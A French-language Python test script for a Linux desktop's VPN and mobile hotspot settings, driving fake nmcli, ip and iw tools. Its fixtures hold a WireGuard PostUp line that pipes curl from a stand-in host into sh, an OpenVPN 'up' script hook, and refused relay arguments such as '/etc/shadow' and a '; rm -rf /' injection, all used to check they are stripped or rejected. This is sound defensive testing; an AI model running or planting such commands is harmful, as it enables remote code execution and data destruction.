#!/usr/bin/python3
"""Pages VPN et Point d'accès sans fil mobile (#660), avec un faux NetworkManager.

  python3 -B scripts/test-vpn-hotspot.py              services, relais root, traductions,
                                                      zone de notification, Paramètres
  xvfb-run -a python3 -B scripts/test-vpn-hotspot.py  + les deux pages GTK et l'ajout d'un VPN

Le faux nmcli garde son état dans un dossier temporaire et note chaque appel :
le test vérifie qu'aucun mot de passe ni clé n'apparaît dans une ligne de
commande, que les profils sont des fichiers 0600 jamais connectés seuls, que
le DNS d'un VPN « tout le trafic » est exclusif, que resolv.conf est remis
lisible après chaque connexion (#380), que le point d'accès impose AES/CCMP
(#416) et refuse de couper la connexion Wi-Fi qui le nourrit.
"""
from importlib.machinery import SourceFileLoader
import importlib.util
import json
import os
from pathlib import Path
import re
import subprocess
import sys
import tempfile
import time

HERE = Path(__file__).resolve().parent
VPN = HERE / "winlux-vpn.py"
HOTSPOT = HERE / "winlux-hotspot.py"
failures = []


def ok(condition, label):
    print(("ok   " if condition else "ÉCHEC ") + label)
    if not condition:
        failures.append(label)


def load(path, name):
    loader = SourceFileLoader(name, str(path))
    spec = importlib.util.spec_from_loader(name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


FAKE_NMCLI = r'''#!/usr/bin/python3
import json, os, re, sys, uuid
from pathlib import Path
state_dir = Path(os.environ["FAKE_NM_STATE"])
connections = Path(os.environ["WINLUX_VPN_CONNECTIONS"])
args = sys.argv[1:]
with open(state_dir / "calls.log", "a", encoding="utf-8") as log:
    log.write(json.dumps(args) + "\n")
state_file = state_dir / "state.json"
state = json.loads(state_file.read_text())
def save(): state_file.write_text(json.dumps(state))
def esc(text): return text.replace("\\", "\\\\").replace(":", "\\:")
def profiles():
    found = []
    for path in sorted(connections.glob("*.nmconnection")):
        values, section = {}, ""
        for line in path.read_text().splitlines():
            if line.startswith("["): section = line.strip("[]"); continue
            if "=" in line:
                key, value = line.split("=", 1); values[f"{section}.{key}"] = value
        found.append((path, values))
    return found
def kind(values):
    return {"wireguard": "wireguard", "vpn": "vpn", "wifi": "802-11-wireless"}.get(values.get("connection.type"), "x")
joined = " ".join(args)
active = state.setdefault("active", {})
if joined == "-t -f RUNNING general": print("running")
elif joined == "-t -f WIFI radio": print(state.get("radio", "enabled"))
elif joined.startswith("-t -f NAME,UUID,TYPE,ACTIVE,STATE,TIMESTAMP,FILENAME connection show"):
    for path, values in profiles():
        ident = values["connection.uuid"]
        print(":".join([esc(values["connection.id"]), ident, kind(values), "yes" if ident in active else "no",
                        "activated" if ident in active else "", "1700000000", esc(str(path))]))
elif joined == "-t -f UUID,FILENAME connection show":
    for path, values in profiles(): print(values["connection.uuid"] + ":" + esc(str(path)))
elif joined == "-t -f TYPE,UUID,ACTIVE,TIMESTAMP,NAME connection show":
    for path, values in profiles():
        ident = values["connection.uuid"]
        print(":".join([kind(values), ident, "yes" if ident in active else "no", "1700000000", esc(values["connection.id"])]))
elif joined == "-t -f TYPE,UUID,NAME connection show --active":
    for path, values in profiles():
        if values["connection.uuid"] in active:
            print(":".join([kind(values), values["connection.uuid"], esc(values["connection.id"])]))
elif joined == "-t -f UUID,DEVICE,STATE connection show --active":
    for ident, device in active.items(): print(f"{ident}:{device}:activated")
elif args[:2] == ["connection", "load"]: pass
elif args[:2] == ["connection", "reload"]: pass
elif args[:4] == ["connection", "import", "type", "openvpn"]:
    text = Path(args[5]).read_text()
    if "remote " not in text:
        print("Error: failed to import: the file to import wasn't a valid openvpn configuration", file=sys.stderr); sys.exit(1)
    ident = str(uuid.uuid4())
    certs = Path(os.environ["XDG_DATA_HOME"]) / "networkmanagement/certificates"
    certs.mkdir(parents=True, exist_ok=True)
    (certs / "vpn-ca.pem").write_text("CA")
    remote = re.search(r"^remote (\S+) ?(\d*)", text, re.M)
    lines = ["[connection]", "id=vpn", f"uuid={ident}", "type=vpn", "permissions=user:root;", "",
             "[vpn]", "service-type=org.freedesktop.NetworkManager.openvpn",
             f"remote={remote[1]}:{remote[2] or 1194}", f"ca={certs / 'vpn-ca.pem'}",
             "connection-type=" + ("password-tls" if "auth-user-pass" in text else "tls"), "",
             "[ipv4]", "method=auto", ""]
    path = connections / "vpn.nmconnection"
    path.write_text("\n".join(lines)); os.chmod(path, 0o600)
    print(f"Connection 'vpn' ({ident}) successfully added.")
elif "connection" in args and "up" in args:
    ident = args[args.index("uuid") + 1]
    device = args[args.index("ifname") + 1] if "ifname" in args else "tun0"
    if state.get("fail_up"):
        print(state["fail_up"], file=sys.stderr); sys.exit(4)
    active[ident] = device; save()
elif args[:3] == ["connection", "down", "uuid"]:
    if args[3] not in active:
        print(f"Error: '{args[3]}' is not an active connection.", file=sys.stderr); sys.exit(10)
    del active[args[3]]; save()
elif args[:3] == ["connection", "delete", "uuid"]:
    for path, values in profiles():
        if values["connection.uuid"] == args[3]: path.unlink()
elif joined in ("-t -f DEVICE,TYPE,STATE,CONNECTION device", "-t -f DEVICE,TYPE,CONNECTION device"):
    for device in state.get("devices", []):
        fields = [device["name"], device["type"]] + ([device.get("state", "connected")] if "STATE" in joined else []) + [esc(device.get("connection", ""))]
        print(":".join(fields))
elif args[:2] == ["-g", "WIFI-PROPERTIES.AP"]: print("yes" if state.get("ap", True) else "no")
elif args[:2] == ["-g", "WIFI-PROPERTIES.5GHZ"]: print("yes")
else:
    print("fake nmcli: " + joined, file=sys.stderr); sys.exit(2)
'''

FAKE_IP = r'''#!/usr/bin/python3
import json, os, sys
from pathlib import Path
state = json.loads((Path(os.environ["FAKE_NM_STATE"]) / "state.json").read_text())
if sys.argv[1:] == ["-4", "route", "show", "default"]:
    for line in state.get("routes", []): print(line)
'''

FAKE_IW = r'''#!/usr/bin/python3
import json, os, sys
from pathlib import Path
state = json.loads((Path(os.environ["FAKE_NM_STATE"]) / "state.json").read_text())
if sys.argv[1:2] == ["dev"] and sys.argv[3:] == ["station", "dump"]:
    for mac in state.get("stations", []): print(f"Station {mac} (on {sys.argv[2]})\n\tinactive time:\t10 ms")
'''

WG_FULL = """[Interface]
# Bureau
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.8.0.2/24, fd86:ea04:1115::2/64
DNS = 10.8.0.1, intra.example
PostUp = curl http://example.invalid/attaque | sh

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
PresharedKey = /UwcSPg38hW/D9Y3tcS1FOV0K1wuURMbS0sesJEP5ak=
Endpoint = vpn.example.org:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
"""

OVPN = """client
dev tun
proto udp
remote vpn.example.org 1194
ca ca.crt
tls-auth ta.key 1
auth-user-pass identifiants.txt
up /tmp/script-dangereux.sh
"""


def write_exe(path, text):
    path.write_text(text)
    path.chmod(0o755)


def environment(work):
    bin_dir = work / "bin"
    bin_dir.mkdir()
    write_exe(bin_dir / "nmcli", FAKE_NMCLI)
    write_exe(bin_dir / "ip", FAKE_IP)
    write_exe(bin_dir / "iw", FAKE_IW)
    perms = work / "perms.sh"
    write_exe(perms, f"#!/bin/sh\necho x >> {work}/perms.log\n")
    root = work / "root"
    (root / "sys/module/wireguard").mkdir(parents=True)
    (root / "usr/lib/NetworkManager/VPN").mkdir(parents=True)
    (root / "usr/lib/NetworkManager/VPN/nm-openvpn-service.name").write_text("[VPN Connector]\n")
    (root / "usr/sbin").mkdir(parents=True)
    (root / "usr/sbin/openvpn").write_text("")
    (root / "usr/sbin/dnsmasq").write_text("")
    (root / "sys/class/ieee80211/phy0").mkdir(parents=True)
    (root / "sys/class/net/wlan0/wireless").mkdir(parents=True)
    (root / "sys/class/net/eth0").mkdir(parents=True)
    (root / "etc").mkdir()
    (root / "etc/hostname").write_text("portable-damien\n")
    connections = work / "connections"
    connections.mkdir()
    (work / "leases").mkdir()
    (work / "state.json").write_text(json.dumps({
        "devices": [{"name": "wlan0", "type": "wifi", "state": "disconnected"},
                    {"name": "eth0", "type": "ethernet", "connection": "Connexion filaire 1"}],
        "routes": ["default via 192.168.1.1 dev eth0 proto dhcp metric 100"]}))
    env = dict(os.environ, PATH=f"{bin_dir}:{os.environ['PATH']}", FAKE_NM_STATE=str(work),
               WINLUX_VPN_CONNECTIONS=str(connections), WINLUX_HOTSPOT_CONNECTIONS=str(connections),
               WINLUX_VPN_DATA=str(work / "vpn-data"), WINLUX_SYS_ROOT=str(root), WINLUX_VPN_DIRECT="1",
               WINLUX_HOTSPOT_DIRECT="1", WINLUX_VPN_PERMS=str(perms), WINLUX_HOTSPOT_PERMS=str(perms),
               WINLUX_HOTSPOT_LEASES=str(work / "leases"), WINLUX_ROOT_SOCKET=str(work / "absent.sock"),
               WINLUX_LANG="fr", HOME=str(work / "home"), XDG_CONFIG_HOME=str(work / "home/.config"),
               WINLUX_TRAY_DIR=str(work / "tray"))
    return env


def state(work, **changes):
    current = json.loads((work / "state.json").read_text())
    current.update(changes)
    (work / "state.json").write_text(json.dumps(current))
    return current


def service(script, env, *args, payload=None):
    result = subprocess.run([sys.executable, "-B", str(script), *args], env=env, capture_output=True, text=True,
                            input=json.dumps(payload) if payload is not None else "", timeout=60)
    line = next((l for l in reversed(result.stdout.splitlines()) if l.startswith("{")), "{}")
    return json.loads(line)


def calls(work):
    path = work / "calls.log"
    return [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []


def test_translations():
    for path, name in ((VPN, "vpn_tr"), (HOTSPOT, "hotspot_tr")):
        module = load(path, name)
        source = path.read_text()
        used = set(re.findall(r'_t\("((?:[^"\\]|\\.)*)"\)', source)) | set(module.ERRORS.values())
        used |= set(re.findall(r'\(\("?[a-z0-9.]+"?, "([^"]+)"\)', source))
        missing = sorted(text for text in used if "{" not in text and text not in module._TR and not text.isascii())
        missing += sorted(text for text in used if "{" in text and text not in module._TR)
        ok(not missing, f"{path.name} : chaque texte affiché existe en anglais, espagnol et allemand ({missing[:3]})")
        ok(all(len(row) == 3 and all(row) for row in module._TR.values()), f"{path.name} : trois traductions par texte")
    settings = (HERE / "winlux-settings.py").read_text()
    start = (HERE / "winlux-start-menu.py").read_text()
    for text in ("VPN", "Point d’accès sans fil mobile"):
        ok(f"'{text}': (" in settings and f"'{text}': (" in start, f"« {text} » traduit dans Paramètres et le menu Démarrer")


def test_relay():
    root = load(HERE / "winlux-root.py", "root_relay_vpn")
    ident = "0b0e9f0a-1111-4222-8333-444455556666"
    allowed = [["winlux-vpn", "status"], ["winlux-vpn", "import", "--stdin"], ["winlux-vpn", "connect", ident],
               ["winlux-vpn", "disconnect", ident], ["winlux-vpn", "remove", ident],
               ["winlux-vpn", "credentials", ident, "--stdin"], ["winlux-hotspot", "status"],
               ["winlux-hotspot", "start"], ["winlux-hotspot", "stop"], ["winlux-hotspot", "configure", "--stdin"]]
    refused = [["winlux-vpn", "import", "/etc/shadow"], ["winlux-vpn", "connect", "--help"],
               ["winlux-vpn", "connect", "Bureau; rm -rf /"], ["winlux-vpn", "credentials", ident, "motdepasse"],
               ["winlux-hotspot", "configure", "--ssid", "x"], ["winlux-hotspot", "start", "wlan0"]]
    ok(all(root.exec_level(args) == "user" for args in allowed), "relais root : commandes VPN et point d'accès permises au compte")
    ok(all(root.exec_level(args) is None for args in refused), "relais root : arguments inattendus refusés (fichiers, mots de passe en ligne de commande)")


def test_wireguard(work, env):
    vpn = load(VPN, "vpn_unit")
    config = vpn.parse_wireguard(WG_FULL)
    text = vpn.wireguard_keyfile("Bureau", config, "11111111-2222-4333-8444-555566667777", "wg0")
    ok("PostUp" not in text and "curl" not in text, "WireGuard : PostUp (script) jamais repris")
    ok("autoconnect=false" in text and "allowed-ips=0.0.0.0/0;::/0;" in text and "persistent-keepalive=25" in text,
       "WireGuard : profil complet, jamais connecté seul au démarrage")
    ok("dns-priority=-50" in text and "dns-search=intra.example;~;" in text,
       "WireGuard tout le trafic : DNS du VPN exclusifs (pas de fuite vers la box)")
    split = vpn.wireguard_keyfile("Partiel", vpn.parse_wireguard(WG_FULL.replace("0.0.0.0/0, ::/0", "10.8.0.0/24")), "x", "wg1")
    ok("dns-priority=50" in split and "~;" not in split, "WireGuard partiel : DNS du VPN en premier seulement")
    for broken in (WG_FULL.replace("PrivateKey", "Clef"), WG_FULL.replace("[Peer]", "[Autre]"),
                   WG_FULL.replace("10.8.0.2/24", "pas-une-adresse")):
        try:
            vpn.parse_wireguard(broken)
            ok(False, "WireGuard : configuration invalide refusée")
        except ValueError as error:
            ok(str(error) == "wg-format", "WireGuard : configuration invalide refusée (wg-format)")

    answer = service(VPN, env, "import", "--stdin", payload={"name": "Bureau", "kind": "wireguard", "config": WG_FULL})
    ok(answer.get("ok") and answer.get("kind") == "wireguard", f"import WireGuard ({answer})")
    profile = next(Path(env["WINLUX_VPN_CONNECTIONS"]).glob("winlux-vpn-*.nmconnection"))
    ok(profile.stat().st_mode & 0o777 == 0o600, "profil WireGuard en 0600")
    ok("interface-name=wg0" in profile.read_text(), "WireGuard : interface wg0 libre choisie")
    ok(["connection", "load", str(profile)] in calls(work), "NetworkManager recharge le profil")
    status = service(VPN, env, "status")
    item = next((c for c in status.get("connections", []) if c["name"] == "Bureau"), {})
    ok(item.get("kind") == "wireguard" and item.get("server") == "vpn.example.org:51820" and not item.get("active"),
       f"état : connexion listée avec son serveur ({item})")
    before = (work / "perms.log").read_text().count("x") if (work / "perms.log").exists() else 0
    answer = service(VPN, env, "connect", item["uuid"])
    ok(answer.get("ok") and service(VPN, env, "status")["connections"][0]["active"], "se connecter au VPN")
    ok((work / "perms.log").read_text().count("x") == before + 1, "resolv.conf remis lisible juste après la connexion (#380)")
    ok(service(VPN, env, "disconnect", item["uuid"]).get("ok"), "se déconnecter")
    state(work, fail_up="Error: Connection activation failed: Secrets were required, but not provided")
    answer = service(VPN, env, "connect", item["uuid"])
    ok(answer.get("error") == "credentials" and "Identifiants" in vpn.error_text(answer),
       "identifiants refusés : message clair, renvoi vers « Identifiants… »")
    state(work, fail_up="Error: Timeout expired (60 seconds)")
    ok(service(VPN, env, "connect", item["uuid"]).get("error") == "timeout", "serveur muet : erreur « timeout »")
    state(work, fail_up="")
    bad = service(VPN, env, "import", "--stdin", payload={"name": "Faux", "kind": "wireguard", "config": "[Interface]\n"})
    ok(bad.get("error") == "wg-format", "import d'un .conf invalide refusé")
    return item["uuid"]


def test_openvpn(work, env):
    vpn = load(VPN, "vpn_unit2")
    folder = work / "home/Téléchargements"
    folder.mkdir(parents=True)
    (folder / "bureau.ovpn").write_text(OVPN)
    (folder / "ca.crt").write_text("-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----\n")
    (folder / "ta.key").write_text("-----BEGIN OpenVPN Static key V1-----\nBBBB\n-----END OpenVPN Static key V1-----\n")
    (folder / "identifiants.txt").write_text("damien\nsecret-du-fichier\n")
    text, user, password = vpn.inline_openvpn(folder / "bureau.ovpn")
    ok("<ca>" in text and "AAAA" in text and "<tls-auth>" in text and "key-direction 1" in text,
       "OpenVPN : certificats cités inclus dans la configuration")
    ok("\nauth-user-pass\n" in text and "identifiants.txt" not in text and user == "damien" and password == "secret-du-fichier",
       "OpenVPN : fichier d'identifiants lu par la page, jamais transmis tel quel")
    ok(vpn.openvpn_needs(text) == (True, False), "OpenVPN : nom d'utilisateur et mot de passe demandés")
    (folder / "ta.key").unlink()
    try:
        vpn.inline_openvpn(folder / "bureau.ovpn")
        ok(False, "OpenVPN : fichier cité absent détecté")
    except FileNotFoundError as error:
        ok(error.args[0] == "ta.key", "OpenVPN : fichier cité absent nommé dans l'erreur")
    answer = service(VPN, env, "import", "--stdin", payload={"name": "Entreprise", "kind": "openvpn", "config": text,
                                                             "username": "damien", "password": "Mot-de-passe-VPN"})
    ok(answer.get("ok") and answer.get("kind") == "openvpn", f"import OpenVPN ({answer})")
    profile = Path(env["WINLUX_VPN_CONNECTIONS"]) / "vpn.nmconnection"
    content = profile.read_text()
    ok("id=Entreprise" in content and "autoconnect=false" in content and "permissions=" not in content,
       "OpenVPN : nom choisi, connexion manuelle, pour tous les comptes")
    ok("password-flags=0" in content and "password=Mot-de-passe-VPN" in content and "username=damien" in content,
       "OpenVPN : identifiants gardés dans le profil système (pas d'agent sans session)")
    ok(profile.stat().st_mode & 0o777 == 0o600, "profil OpenVPN en 0600")
    ok(not any("Mot-de-passe-VPN" in " ".join(args) for args in calls(work)), "aucun mot de passe dans une ligne de commande")
    data = Path(env["WINLUX_VPN_DATA"])
    ok(any(data.glob("*/networkmanagement/certificates/vpn-ca.pem")), "certificats inclus rangés sous /etc/winlux/vpn")
    status = service(VPN, env, "status")
    item = next(c for c in status["connections"] if c["name"] == "Entreprise")
    ok(item["kind"] == "openvpn" and item["server"] == "vpn.example.org:1194", "état : OpenVPN listé avec son serveur")
    ok(service(VPN, env, "credentials", item["uuid"], "--stdin", payload={"password": "Nouveau-mdp"}).get("ok")
       and "password=Nouveau-mdp" in profile.read_text(), "« Identifiants… » change le mot de passe")
    ok(service(VPN, env, "remove", item["uuid"]).get("ok") and not profile.exists()
       and not any(data.glob("*/networkmanagement")), "supprimer : profil et certificats effacés")
    bad = service(VPN, env, "import", "--stdin", payload={"name": "X", "kind": "openvpn", "config": "dev tun\n"})
    ok(bad.get("error") == "ovpn-format", "import d'un .ovpn illisible : message clair")


def test_hotspot(work, env):
    hotspot = load(HOTSPOT, "hotspot_unit")
    status = service(HOTSPOT, env, "status")
    ok(status.get("ok") and status.get("capable") and not status.get("active"), f"point d'accès : état ({status})")
    ok(status.get("ssid", "").startswith("portable-damien ") and len(status.get("key", "")) == 10,
       "point d'accès : nom et mot de passe proposés la première fois")
    profile = Path(env["WINLUX_HOTSPOT_CONNECTIONS"]) / "winlux-hotspot.nmconnection"
    text = profile.read_text()
    ok(profile.stat().st_mode & 0o777 == 0o600 and "mode=ap" in text and "method=shared" in text and "autoconnect=false" in text,
       "point d'accès : profil 0600, mode AP, connexion partagée")
    ok("pairwise=ccmp;" in text and "group=ccmp;" in text and "gcmp" not in text and "tkip" not in text,
       "point d'accès : AES/CCMP imposé, jamais GCMP seul ni TKIP (#416)")
    ok(status.get("uplink", {}).get("device") == "eth0", "point d'accès : partage la connexion Ethernet")
    answer = service(HOTSPOT, env, "start")
    ok(answer.get("ok") and ["-w", "40", "connection", "up", "uuid", hotspot.PROFILE_UUID, "ifname", "wlan0"] in calls(work),
       "point d'accès démarré sur la carte Wi-Fi")
    (work / "leases/dnsmasq-wlan0.leases").write_text("1900000000 aa:bb:cc:dd:ee:01 10.42.0.23 telephone-camille *\n")
    state(work, stations=["aa:bb:cc:dd:ee:01"])
    status = service(HOTSPOT, env, "status")
    ok(status.get("active") and status.get("clients") == [{"mac": "aa:bb:cc:dd:ee:01", "ip": "10.42.0.23", "name": "telephone-camille"}],
       "appareils connectés : nom, adresse IP et adresse physique")
    answer = service(HOTSPOT, env, "configure", "--stdin", payload={"ssid": "Partage", "key": "court"})
    ok(answer.get("error") == "key", "mot de passe trop court refusé")
    answer = service(HOTSPOT, env, "configure", "--stdin", payload={"ssid": "Partage de Damien", "key": "une-cle-solide",
                                                                    "security": "wpa3", "band": "5"})
    text = profile.read_text()
    ok(answer.get("ok") and "key-mgmt=sae" in text and "pmf=3" in text and "band=a" in text,
       "Modifier : WPA3 et 5 GHz enregistrés, point d'accès relancé")
    ok(service(HOTSPOT, env, "status").get("ssid") == "Partage de Damien", "nouveau nom relu")
    ok(not any("une-cle-solide" in " ".join(args) for args in calls(work)), "mot de passe du point d'accès jamais en ligne de commande")
    ok(service(HOTSPOT, env, "stop").get("ok") and not service(HOTSPOT, env, "status").get("active"), "point d'accès arrêté")
    # Seule carte Wi-Fi = connexion à Internet : refus clair, la connexion n'est pas coupée.
    state(work, routes=["default via 192.168.1.1 dev wlan0 proto dhcp metric 600"],
          devices=[{"name": "wlan0", "type": "wifi", "state": "connected", "connection": "Maison"}])
    before = len(calls(work))
    answer = service(HOTSPOT, env, "start")
    ok(answer.get("error") == "same-device" and not any("up" in args for args in calls(work)[before:]),
       "même carte que la connexion Wi-Fi : refus clair, rien n'est coupé")
    ok(service(HOTSPOT, env, "status").get("same_device"), "page prévenue avant même d'essayer")
    state(work, routes=[])
    ok(service(HOTSPOT, env, "start").get("error") == "no-internet", "pas de connexion à partager : refus clair")
    state(work, routes=["default via 192.168.1.1 dev eth0 metric 100"], ap=False,
          devices=[{"name": "wlan0", "type": "wifi"}, {"name": "eth0", "type": "ethernet"}])
    old = dict(os.environ)
    os.environ.update(env)
    try:
        module = load(HOTSPOT, "hotspot_unit_ap")
        ok(not module.available(), "carte sans mode point d'accès : page cachée")
        state(work, ap=True)
        ok(module.available(), "carte capable : page visible")
        (Path(env["WINLUX_SYS_ROOT"]) / "usr/sbin/dnsmasq").unlink()
        ok(not module.available(), "sans dnsmasq : page cachée")
        (Path(env["WINLUX_SYS_ROOT"]) / "usr/sbin/dnsmasq").write_text("")
        vpn = load(VPN, "vpn_avail")
        ok(vpn.available() and vpn.kinds() == ["wireguard", "openvpn"], "VPN : WireGuard et OpenVPN détectés")
        (Path(env["WINLUX_SYS_ROOT"]) / "sys/module/wireguard").rmdir()
        os.environ["WINLUX_KERNEL_RELEASE"] = "0.0-test"
        ok(load(VPN, "vpn_avail2").kinds() == ["openvpn"], "sans module wireguard : seul OpenVPN proposé")
        (Path(env["WINLUX_SYS_ROOT"]) / "usr/sbin/openvpn").unlink()
        ok(not load(VPN, "vpn_avail3").available(), "ni WireGuard ni OpenVPN : page VPN cachée")
        (Path(env["WINLUX_SYS_ROOT"]) / "usr/sbin/openvpn").write_text("")
        (Path(env["WINLUX_SYS_ROOT"]) / "sys/module/wireguard").mkdir()
    finally:
        os.environ.clear()
        os.environ.update(old)


def test_tray(work, env, ident):
    service(VPN, env, "connect", ident)
    service(HOTSPOT, env, "start")
    result = subprocess.run([sys.executable, "-B", str(HERE / "winlux-tray.py"), "network"], env=env,
                            capture_output=True, text=True, timeout=30)
    tooltip = re.search(r"<tool>(.*)</tool>", result.stdout, re.S)
    tooltip = tooltip[1] if tooltip else result.stdout + result.stderr
    ok("VPN : Bureau" in tooltip and "Point d’accès sans fil mobile activé" in tooltip,
       f"zone de notification : VPN et point d'accès dans l'infobulle ({tooltip!r})")
    icon = re.search(r"<img>(.*)</img>", result.stdout)
    ok(icon and Path(icon[1]).name.startswith("network-1-0-11"), "zone de notification : icône réseau marquée (bouclier, ondes)")
    service(VPN, env, "disconnect", ident)
    service(HOTSPOT, env, "stop")


def test_settings():
    settings = (HERE / "winlux-settings.py").read_text()
    pages = (HERE / "winlux-settings-pages.py").read_text()
    start = (HERE / "winlux-start-menu.py").read_text()
    popup = (HERE / "winlux-popup.py").read_text()
    ok('_t("Applications installées"), _t("VPN"), _t("Point d’accès sans fil mobile")' in settings,
       "Paramètres : pages 40 VPN et 41 Point d'accès sans fil mobile")
    ok('(_t("Réseau et Internet"), [35, 2, 40, 41, 20, 28])' in settings, "Réseau et Internet : Wi-Fi, Ethernet, VPN, point d'accès")
    ok('"network-vpn": 40' in settings and '"network-mobilehotspot": 41' in settings, "ms-settings:network-vpn et network-mobilehotspot")
    ok("PAGE_VPN = 40" in pages and "PAGE_HOTSPOT = 41" in pages and "if page == PAGE_HOTSPOT:" in pages,
       "pages masquées après détection réelle")
    ok('(40, "VPN"' in start and '(41, "Point d’accès sans fil mobile"' in start, "recherche du menu Démarrer : VPN et point d'accès")
    ok('"vpn": side_available("winlux-vpn")' in popup and '"hotspot": side_available("winlux-hotspot")' in popup,
       "Réglages rapides : tuiles VPN et point d'accès selon la machine")


def walk(widget, Gtk):
    yield widget
    if isinstance(widget, Gtk.Container):
        for child in widget.get_children():
            yield from walk(child, Gtk)


def pump(Gtk, seconds):
    end = time.time() + seconds
    while time.time() < end:
        while Gtk.events_pending():
            Gtk.main_iteration_do(False)
        time.sleep(0.02)


def test_pages(work, env):
    for key, value in env.items():
        os.environ[key] = value
    state(work, routes=["default via 192.168.1.1 dev eth0 metric 100"], ap=True, active={},
          devices=[{"name": "wlan0", "type": "wifi", "state": "disconnected"},
                   {"name": "eth0", "type": "ethernet", "connection": "Connexion filaire 1"}])
    os.environ["WINLUX_SETTINGS_PAGE"] = "40"
    import runpy
    settings = runpy.run_path(str(HERE / "winlux-settings.py"), run_name="settings_vpn_test")
    Gtk, GLib = settings["Gtk"], settings["GLib"]
    window = settings["Settings"]()
    ok(window.current == 40 and 40 not in window.hidden_pages and 41 not in window.hidden_pages,
       "Paramètres s'ouvre sur la page VPN ; point d'accès visible")
    panel = window.vpn_panel
    deadline = time.time() + 20
    while time.time() < deadline and not panel.list_box.get_children():
        pump(Gtk, 0.1)
    labels = [w.get_text() for w in walk(window.body, Gtk) if isinstance(w, Gtk.Label)]
    ok("Bureau" in labels and any("WireGuard" in t and "vpn.example.org" in t for t in labels), "page VPN : connexion listée")
    folder = work / "home/Bureau-vpn"
    folder.mkdir(parents=True)
    (folder / "maison.conf").write_text(WG_FULL)
    seen = {}

    def fill():
        dialog = getattr(panel, "add_window", None)
        if dialog is None: return True
        dialog.choose_file(str(folder / "maison.conf"))
        widgets = list(walk(dialog, Gtk))
        name = next(w for w in widgets if isinstance(w, Gtk.Entry) and w.get_name() == "vpn-name")
        seen["name"] = name.get_text()
        seen["password_hidden"] = not next(w for w in widgets if isinstance(w, Gtk.Entry) and w.get_name() == "vpn-password").get_visible()
        if os.environ.get("WINLUX_VPN_CAPTURE"):
            pump(Gtk, 0.3)
            from gi.repository import Gdk
            shot = Gdk.pixbuf_get_from_window(dialog.get_window(), 0, 0, dialog.get_allocated_width(), dialog.get_allocated_height())
            shot.savev(os.environ["WINLUX_VPN_CAPTURE"].replace(".png", "-ajout.png"), "png", [], [])
        dialog.response(Gtk.ResponseType.OK)
        return False
    GLib.timeout_add(200, fill)
    next(w for w in walk(window.body, Gtk) if isinstance(w, Gtk.Button) and w.get_name() == "vpn-add").clicked()
    deadline = time.time() + 20
    while time.time() < deadline and "ajoutée" not in panel.message.get_text():
        pump(Gtk, 0.1)
    ok(seen.get("name") == "maison" and seen.get("password_hidden"), "ajout : nom proposé d'après le fichier, pas de mot de passe pour WireGuard")
    ok("Connexion « maison » ajoutée." in panel.message.get_text(), f"ajout d'un VPN depuis la page ({panel.message.get_text()})")
    if os.environ.get("WINLUX_VPN_CAPTURE"):
        pump(Gtk, 1)
        from gi.repository import Gdk
        shot = Gdk.pixbuf_get_from_window(window.get_window(), 0, 0, window.get_allocated_width(), window.get_allocated_height())
        shot.savev(os.environ["WINLUX_VPN_CAPTURE"], "png", [], [])
    window.open_page(41)
    panel = window.hotspot_panel
    deadline = time.time() + 20
    while time.time() < deadline and not panel.values["ssid"].get_text():
        pump(Gtk, 0.1)
    ok(panel.values["ssid"].get_text() == "Partage de Damien" and panel.uplink_label.get_text().startswith("Ethernet"),
       f"page point d'accès : nom et connexion partagée ({panel.uplink_label.get_text()})")
    panel.switch.set_active(True)
    deadline = time.time() + 20
    while time.time() < deadline and "Activé" not in panel.state_label.get_text():
        pump(Gtk, 0.1)
    ok("Activé · 1 appareil(s) connecté(s) sur 8" == panel.state_label.get_text(), f"page point d'accès : activé, appareils comptés ({panel.state_label.get_text()})")
    pump(Gtk, 0.5)
    labels = [w.get_text() for w in walk(panel.devices, Gtk) if isinstance(w, Gtk.Label)]
    ok("telephone-camille" in labels, "page point d'accès : appareil connecté listé")
    width = window.get_allocated_width()
    screen = window.get_screen()
    ok(width <= screen.get_width(), f"page tient dans l'écran ({width} px sur {screen.get_width()})")
    if os.environ.get("WINLUX_VPN_CAPTURE"):
        pump(Gtk, 1)
        from gi.repository import Gdk
        shot = Gdk.pixbuf_get_from_window(window.get_window(), 0, 0, window.get_allocated_width(), window.get_allocated_height())
        shot.savev(os.environ["WINLUX_VPN_CAPTURE"].replace(".png", "-point-acces.png"), "png", [], [])
    window.destroy()


def main():
    work = Path(tempfile.mkdtemp(prefix="winlux-vpn-"))
    env = environment(work)
    test_translations()
    test_relay()
    test_settings()
    ident = test_wireguard(work, env)
    test_openvpn(work, env)
    test_hotspot(work, env)
    test_tray(work, env, ident)
    if os.environ.get("DISPLAY"):
        test_pages(work, env)
    if failures:
        print(f"\n{len(failures)} échec(s)")
        raise SystemExit(1)
    print("\nVPN et point d'accès sans fil mobile : tout est bon.")


if __name__ == "__main__":
    main()
